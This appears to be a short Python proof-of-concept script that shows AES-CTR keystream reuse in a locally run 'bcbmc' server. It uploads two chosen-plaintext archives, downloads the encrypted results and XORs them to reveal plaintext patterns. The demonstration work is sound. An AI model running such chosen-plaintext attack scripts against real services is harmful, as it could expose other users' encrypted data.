#!/usr/bin/env python3
"""
Quick demo that IV==Key in AES-CTR leaks plaintext.
Prereqs: bcbmc server running locally and curl installed.
"""
import os, subprocess, tempfile, time, binascii, requests, sys

BASE = "http://localhost:8888"
EMAIL = "demo"
PASS  = "demo"

def curl_upload(path):
    subprocess.check_call(["curl", "-X", "POST", "--data-binary", f"@{path}",
                           f"{BASE}/upload/{EMAIL}/{PASS}"])

def curl_download():
    r = requests.get(f"{BASE}/download/{EMAIL}/{PASS}", verify=False)
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".ehtml")
    tmp.write(r.content)
    tmp.close()
    return tmp.name

def make_archive(content, name):
    with open("all.html", "w") as fp:
        fp.write(content)
    tar = f"{name}.tar"
    subprocess.check_call(["tar", "cf", tar, "all.html"])
    return tar

def main():
    # First version
    tar1 = make_archive("A"*1024, "a")
    curl_upload(tar1)
    time.sleep(1)
    # Second version
    tar2 = make_archive("B"*1024, "b")
    curl_upload(tar2)
    time.sleep(1)
    # Download two encrypted files
    e1 = curl_download()
    e2 = curl_download()
    c1 = open(e1, "rb").read()
    c2 = open(e2, "rb").read()
    x = bytes(a ^ b for a, b in zip(c1, c2))
    print("First 64 bytes of XOR(c1,c2):", binascii.hexlify(x[:64]).decode())
    print("If you see lots of 4141/4242 patterns, keystream reuse is confirmed.")

if __name__ == "__main__":
    main()
